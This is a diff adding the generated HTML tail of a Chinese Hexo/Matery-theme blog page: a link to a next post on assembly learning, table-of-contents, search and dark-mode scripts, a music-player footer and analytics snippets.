+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="汇编学习">
+                        
+                        <span class="card-title">汇编学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-10-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" class="post-category">
+                                    二进制
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B1%87%E7%BC%96/">
+                        <span class="chip bg-color">汇编</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2024-2025</span>
+            
+            <a href="/about" target="_blank">Doramer</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">67.6k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2657100414@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2657100414" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2657100414" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
